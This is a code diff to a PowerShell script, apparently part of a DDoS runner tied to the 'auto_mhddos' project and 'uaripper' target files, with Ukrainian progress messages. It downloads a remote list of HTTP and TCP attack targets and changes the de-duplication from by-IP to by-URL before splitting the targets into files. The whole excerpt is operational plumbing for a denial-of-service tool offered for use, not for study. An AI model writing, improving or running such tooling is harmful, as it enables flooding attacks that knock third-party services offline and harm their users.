@@ -24,11 +24,19 @@ Write-MiddleHost "Powershell v.$($PSVersionTable.PSVersion)" -ForegroundColor 'G
 # If ip was not resolved asume as unique
 Write-MiddleHost "Завантаження цілей" -NoNewline
 $TargetsSrc = "https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets"
+
+# IP FILTERING:
+# Slow and not confirmed. Produce less targets, some urls in the list have the same ip
+# $TargetsList = ( ( Download-String -SourceUrl $TargetsSrc ) -split "\n" |
+#     Where-Object { ($_ -like 'http*') -or ($_ -like 'tcp://*') }).Split(" ") |
+#     Foreach-Object { [PsCustomObject]@{ 'address' = "$_"; 'ip' = Get-Ipv4Address -address $_ } } |
+#     Sort-Object -Property 'ip' -Unique |
+#     Select-Object -ExpandProperty 'address'
+
+# URL FILTERING:
 $TargetsList = ( ( Download-String -SourceUrl $TargetsSrc ) -split "\n" |
     Where-Object { ($_ -like 'http*') -or ($_ -like 'tcp://*') }).Split(" ") |
-    Foreach-Object { [PsCustomObject]@{ 'address' = "$_"; 'ip' = Get-Ipv4Address -address $_ } } |
-    Sort-Object -Property 'ip' -Unique |
-    Select-Object -ExpandProperty 'address'
+    Sort-Object -Unique
 
 # create files with targets
 $TargetFiles = 'xaa.uaripper.txt', 'xab.uaripper.txt', 'xac.uaripper.txt', 'xad.uaripper.txt'
